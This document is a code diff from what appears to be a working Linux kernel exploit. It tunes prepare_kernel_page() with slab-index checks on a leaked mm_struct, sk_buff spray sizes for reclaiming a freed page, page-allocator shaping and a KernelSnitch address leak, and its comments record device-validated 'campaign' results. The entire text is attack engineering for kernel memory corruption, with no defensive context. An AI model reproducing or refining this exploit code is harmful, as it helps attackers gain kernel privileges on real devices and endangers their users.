@@ -2260,6 +2260,29 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 #else
   pr_info("mm leaked=%016zx base=%016zx object_index=%zu\n",
           leaked, base, (leaked - base) / MM_STRUCT_SZ);
+#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
+    defined(APP_SLIDE_MIN_OBJECT_INDEX)
+  /*
+   * Campaign 20: the non-fresh path previously accepted every index.  PR
+   * #303's device-validated UEDZE4 partition starts at 27; index 22 means
+   * the slab was not fully reclaimed/returned, so the SKB spray cannot land
+   * on the freed page (analysis gatemiss §3).  Returning 0 makes
+   * prepare_good_kernel_page() take a fresh mm page.
+   */
+  size_t slide_object_index = (leaked - base) / MM_STRUCT_SZ;
+  if (payload_mode == PAGE_PAYLOAD_SLIDE &&
+      slide_object_index < APP_SLIDE_MIN_OBJECT_INDEX) {
+    pr_warning("p0 mm candidate rejected object_index=%zu < %d\n",
+               slide_object_index, APP_SLIDE_MIN_OBJECT_INDEX);
+    kernelsnitch_cleanup(ks);
+    ks = NULL;
+    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
+      kill_child(prepare_ctx.childs[i]);
+    }
+    cleanup_page_prepare_state();
+    return 0;
+  }
+#endif
 #endif
   int slide_bank_configured = 1;
 #if defined(APP_PAYLOAD) && APP_PAYLOAD && \
@@ -2315,10 +2338,22 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   int pcp_shaping_sv[2];
   SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_shaping_sv));
 
+  /*
+   * Campaign 20: the slide reclaim sends exactly one order-3 fragment
+   * (0x8e80) so the freed page cannot be claimed by the markerless second
+   * chunk.  The fops page keeps the proven 0x10000 two-fragment spray.
+   */
+  size_t reclaim_send_size = SKB_SEND_SIZE;
+#if defined(SLIDE_SKB_SEND_SIZE)
+  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
+    reclaim_send_size = SLIDE_SKB_SEND_SIZE;
+  }
+#endif
+
   struct iovec iov;
   memset(&iov, 0, sizeof(iov));
   iov.iov_base = skb_buf;
-  iov.iov_len = SKB_SEND_SIZE;
+  iov.iov_len = reclaim_send_size;
 
   struct msghdr msg;
   memset(&msg, 0, sizeof(msg));
@@ -2499,8 +2534,8 @@ uintptr_t prepare_kernel_page(int payload_mode) {
           reclaim_sent, reclaim_sends, payload_mode, reclaim_errno);
   log_mm_slabinfo("after-exact-drain-reclaim");
 #else
-  pr_info("sk_buff reclaim sends=%d/%d mode=%d\n",
-          reclaim_sent, reclaim_sends, payload_mode);
+  pr_info("sk_buff reclaim sends=%d/%d size=0x%zx mode=%d\n",
+          reclaim_sent, reclaim_sends, reclaim_send_size, payload_mode);
 #endif
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
   pr_info("kernel page cleanup stage=kernelsnitch begin mode=%d base=%016zx\n",
